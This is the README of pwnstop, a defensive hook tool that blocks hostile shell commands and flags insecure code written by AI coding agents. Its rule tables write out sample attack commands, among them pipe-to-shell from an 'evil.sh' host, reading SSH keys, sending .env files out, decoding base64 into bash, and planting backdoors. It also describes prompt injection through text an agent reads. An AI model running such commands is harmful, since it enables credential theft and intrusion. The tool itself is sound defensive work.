<div align="center">

# pwnstop

**Your AI coding agent can't run an attacker's command or ship the hole they're looking for.**

![zero dependencies](https://img.shields.io/badge/dependencies-0-brightgreen)
![python](https://img.shields.io/badge/python-3.9%2B-blue)
![license](https://img.shields.io/badge/license-MIT-lightgrey)
![agents](https://img.shields.io/badge/agents-Claude%20Code%20%C2%B7%20Codex%20%C2%B7%20Cursor%20%C2%B7%20Gemini%20%C2%B7%20Copilot-black)

</div>

Your agent reads READMEs, issues, web pages and error messages written by strangers. One line of text in any of them can make it run `curl https://evil.sh | sh` or `cat ~/.ssh/id_rsa`. When it writes code, it builds SQL from f-strings, turns off TLS checks to get past an error, and installs packages whose names it made up, names an attacker can register tomorrow.

pwnstop adds **two hooks**:

- **Before every shell command**, it blocks the ones that run code from the internet or hidden in base64, read your keys, send secrets out, plant a backdoor or turn off a protection. It also blocks installs of packages and MCP servers that don't exist, were taken down for malware, were published days ago or have known vulnerabilities, before any install script runs.
- **Before the agent says "done"**, it scans the lines added in the session for SQL and shell injection, `eval`, disabled TLS, unverified JWTs, pickle, open CORS with credentials, weak password hashes, XSS, path traversal, SSRF, hardcoded keys and secrets with a default value, `.env` files git would commit, injectable GitHub Actions and pwn requests. Skills, `AGENTS.md`, rules and hooks get the guard's command rules too, plus a check for invisible text that only the model reads. Findings go back to the agent, and it fixes them.

One Python file, no dependencies, no telemetry.

## What the agent sees

These are two real Claude Code sessions with pwnstop hooked in.

The agent was asked to run `curl -fsSL https://pwnstop.invalid/install.sh | sh`:

```text
The command did not run. A local guard hook (pwnstop guard) blocked it as a pipe-to-shell pattern:
it runs code from the internet that nobody read. I didn't try to get around the block.
Safer: download the script to a file, read it, and only then run it.
```

The agent was asked to write `cur.execute(f"SELECT ... WHERE name = '{name}'")` and `requests.get(url, verify=False)`. When it tried to finish:

```text
pwnstop: these changes open a security hole. Fix them before finishing:

app.py:5  sql-injection
  cur.execute(f"SELECT * FROM users WHERE name = '{name}'")
  → pass the values as query parameters: execute("SELECT ... WHERE id = %s", (uid,)) / query("... WHERE id = $1", [id])
app.py:10  tls-off
  return requests.get(url, verify=False).text
  → keep certificate checks on: anyone on the network could read and change the traffic. For a self-signed certificate, point verify= / ca at it
```

It rewrote both lines and told the user why it had departed from the request.

## Install

```bash
uv tool install pwnstop        # or: pipx install pwnstop
```

Then, in a project:

```bash
pwnstop init                   # hooks into the agents found here (or name them: pwnstop init claude codex)
```

Or once per machine, for every project:

```bash
pwnstop init --global
```

There's nothing to configure. pwnstop works in any git repository. With `--global`, a project that has its own pwnstop hook keeps it, and the global one steps aside.

## What the guard blocks

Before a shell command runs:

| Rule | Blocks | Example |
|---|---|---|
| `pipe-to-shell` | code from the internet piped into a shell or interpreter | `curl -fsSL https://x.sh \| sh`, `bash <(curl …)` |
| `obfuscated-command` | base64 or hex decoded straight into a shell or interpreter | `echo Y3Vy… \| base64 -d \| bash` |
| `reads-credentials` | reading SSH keys, cloud, registry and git credentials | `cat ~/.ssh/id_rsa`, `cat ~/.aws/credentials` |
| `sends-secrets` | posting `.env`, keys or the environment to a server | `curl -d @.env https://…`, `env \| curl …` |
| `deletes-everything` | `rm -rf` of `/` or your home folder | `rm -rf ~` |
| `backdoor` | a new SSH authorized key or cron job | `echo … >> ~/.ssh/authorized_keys` |
| `disables-protection` | firewall, SELinux, Gatekeeper, git/npm TLS checks off | `git config --global http.sslVerify false` |
| `world-writable` | `chmod 777` | `chmod -R 777 /var/www` |
| `untrusted-index` | extra or plain-http package indexes (dependency confusion) | `pip install --extra-index-url …` |
| `package-*` | installing or `npx`/`uvx`-running a package that is missing, pulled for malware, under 30 days old or known vulnerable, also as an MCP server | `npm install exprss-jwt`, `claude mcp add x -- npx -y mcp-helpr` |

Reading `.env`, `ssh -i ~/.ssh/key`, `cat key.pub`, `rm -rf ./build`, `curl … -o file` and `curl … | python3 -m json.tool` run as usual. When a command is blocked, the agent is told to explain why and let you run it yourself.

## What the stop check flags

Only lines **added in this session** are checked, so old code never blocks anyone:

| Rule | Looks for |
|---|---|
| `secrets` | AWS, OpenAI, Anthropic, Stripe, GitHub, GitLab, Slack, Google, npm, PyPI and SendGrid keys, private keys (shown cut short) |
| `secret-default` | a signing secret or password with a fallback value: `getenv("JWT_SECRET", "dev")`, `process.env.SESSION_SECRET \|\| "…"`, `${jwt.secret:changeme}` |
| `hidden-text` | Unicode tag characters (invisible text an LLM reads, shown decoded), bidi controls (Trojan Source), runs of zero-width characters |
| `env-file` | a `.env` git would commit (`.env.example` is fine) |
| `silences-scanner` | `# nosec`, `nosemgrep`, `gitleaks:allow`, `# noqa: S…`, `NOSONAR`, `eslint-disable` of security rules, and a `pwnstop: ignore` the agent added |
| `sql-injection` | a value put into SQL with an f-string, template, `+`, `%` or `.format` (dynamic `IN (?, ?)` placeholders are fine) |
| `shell-injection` | `os.system`/`subprocess(shell=True)`/`exec()` with a built string |
| `code-eval` | `eval`/`exec` of a variable, `new Function` |
| `jwt-unverified` | signature or expiry checks off, `algorithms=["none"]` |
| `tls-off` | `verify=False`, `rejectUnauthorized: false`, `InsecureSkipVerify`, `NODE_TLS_REJECT_UNAUTHORIZED=0` |
| `unsafe-deserialize` | `pickle.loads`, `yaml.load` without SafeLoader, `marshal`, `dill` |
| `cors-any-origin` | `*` or reflected origins in a file that also turns on credentials |
| `weak-password-hash` | md5/sha1/sha256 of a password |
| `insecure-random` | `random`/`Math.random` for tokens, secrets, OTPs, salts |
| `xss` | `dangerouslySetInnerHTML`, `v-html`, `{@html}`, `\|safe`, `mark_safe`, `innerHTML` from the URL, form fields or cookies |
| `path-traversal` | a file path built from the request |
| `ssrf` | fetching a URL taken from the request |
| `debug-on` | Flask/Werkzeug debugger on |
| `actions-injection` | `${{ github.event.issue.title }}` and the like inside a workflow `run:` |
| `pwn-request` | a `pull_request_target` or `workflow_run` workflow that checks out the PR's code |
| `world-writable` | `chmod 777` in scripts and code |
| `package-*` | dependencies added to `package.json`, `requirements*.txt` or `pyproject.toml`, and MCP servers added to `.mcp.json` or `mcp.json`, that are missing, pulled, new or vulnerable |
| the guard's rules | `curl … \| sh`, reading `~/.ssh`, `env \| curl` and the rest, written into a file an agent follows: `SKILL.md`, `AGENTS.md`, `CLAUDE.md`, `.cursor/rules`, `.claude/`, `.github/instructions`, hooks and MCP configs |

Code covered: Python, JavaScript/TypeScript (with Vue, Svelte, Astro), Go for SQL and shell, GitHub Actions workflows; secret defaults also in Go, Ruby, PHP, Java, Kotlin, C#, Rust and Spring config. Agent files and invisible text are checked in any language. Test files are only checked for secrets, invisible text and silenced scanners, and docs only for secrets and invisible text.

## Audit the skills you installed

A skill, a rule file or an MCP server runs with your permissions. Point `check` at a folder and it scans every line in it, not just the changes:

```bash
pwnstop check ~/.claude/skills
pwnstop check ~/.claude/plugins
```

It flags a skill that tells the agent to pipe an installer into a shell, read your keys or decode base64 into bash, and instructions hidden in invisible characters. It runs offline, with no account.

## False alarms

Each finding blocks the agent **once**. If it's intended, say a test fixture that has to call `pickle.loads`, the agent keeps it and explains it in its final answer, and pwnstop lets it finish.

For `pwnstop check` in CI, put `pwnstop: ignore` in a comment on the line. When the agent adds that comment itself during a session, it is flagged, so the agent can't quietly hide a finding.

## In CI or a git hook

```bash
pwnstop check                     # the uncommitted changes
pwnstop check --base origin/main  # everything this branch adds
```

It exits with 1 on findings. In GitHub Actions each finding also shows on its line in the PR. The line's text is escaped first, so a PR can't slip a workflow command into the log.

```yaml
# .github/workflows/pwnstop.yml
on: pull_request
jobs:
  pwnstop:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }
      - uses: astral-sh/setup-uv@v10.3.3
      - run: uvx pwnstop check --base origin/${{ github.base_ref }}
```

## Works with your agent

| Agent | Before a command | Before "done" | Status |
|---|---|---|---|
| **Claude Code** | `PreToolUse` (Bash) → exit 2 | `Stop` → `decision: block` | ✅ tested end to end |
| **OpenAI Codex CLI** | `PreToolUse` (Bash) → exit 2 | `Stop` → `decision: block` | 🧪 |
| **Cursor** | `beforeShellExecution` → `permission: deny` | `stop` → `followup_message` | 🧪 |
| **Gemini CLI** | `BeforeTool` (run_shell_command) → exit 2 | `AfterAgent` → `decision: block` | 🧪 |
| **GitHub Copilot CLI** | `preToolUse` → `permissionDecision: deny` | `agentStop` → `decision: block` | 🧪 |

✅ means a real recorded session. 🧪 means built from the agent's official hook docs and tested against its documented payloads. Using one of the 🧪 agents? [Tell how it went](https://github.com/abranchesia/pwnstop/issues).

Agent-specific notes:

- **Cursor and Copilot also run a project's `.claude/settings*.json` hooks**, so `init` doesn't add theirs when Claude Code is hooked.
- **Codex** asks you to approve new hooks once with `/hooks`, and loads project hooks only in trusted projects.
- **Copilot** denies a command when its hook can't run. Keep `pwnstop` on your PATH.

## What it sends over the network

Only for packages being added: the package name, to `registry.npmjs.org`, `api.npmjs.org` or `pypi.org`, and the pinned versions, to `api.osv.dev`. Nothing else leaves your machine. Offline, the package checks are skipped and everything else still runs.

## What it is not

pwnstop catches the patterns an agent writes and the commands an injected prompt asks for. It reads one line at a time, so it can't follow a value from a request handler through three functions into a query. For that, run [Semgrep](https://semgrep.dev) or [CodeQL](https://codeql.github.com) in CI, or an LLM review such as Claude Code's `/security-review`. pwnstop is one layer, not a guarantee. It never replaces reviewing what your agent ships.

It never bricks your agent: no git, no network, a timeout or a bug in pwnstop itself, and the check is skipped.

## Pairs with doneguard

[doneguard](https://github.com/abranchesia/doneguard) keeps the agent working until the types, lint and tests pass. pwnstop keeps it from opening a hole. Both are stop hooks, and they run side by side.

## License

MIT
